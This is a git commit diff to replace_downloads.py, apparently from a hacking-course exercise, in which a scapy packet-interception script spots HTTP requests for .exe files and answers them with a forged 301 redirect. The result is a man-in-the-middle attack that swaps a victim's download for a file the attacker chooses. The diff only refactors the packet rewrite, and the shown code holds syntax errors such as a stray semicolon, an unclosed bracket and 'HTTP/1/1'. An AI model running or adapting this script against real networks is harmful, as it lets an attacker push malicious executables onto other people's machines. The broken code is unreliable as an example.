376419322b496d3dd93f2f72b4eb12a124c61bcf
Ross M <44169316+Scunnered@users.noreply.github.com>
2020-06-15 21:04:03 +0100

    Intercepting & Replacing Downloads on The Network

--- replace_downloads.py
+++ replace_downloads.py
@@ -10,17 +10,13 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw.load:
                 print(" -/- exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list;
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("-/- Replacing file")
-                scapy_packet[scapy.Raw].load = "HTTP/1/1 301 Moved Permanently\nLocation: https://www/rarlab.com/rar/wrar56b1.exe\n\n"
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                modified_packet = set_load(scapy_packet, "HTTP/1/1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
 
+                packet.set_payload(str(modified_packet))
 
     packet.accept()
 
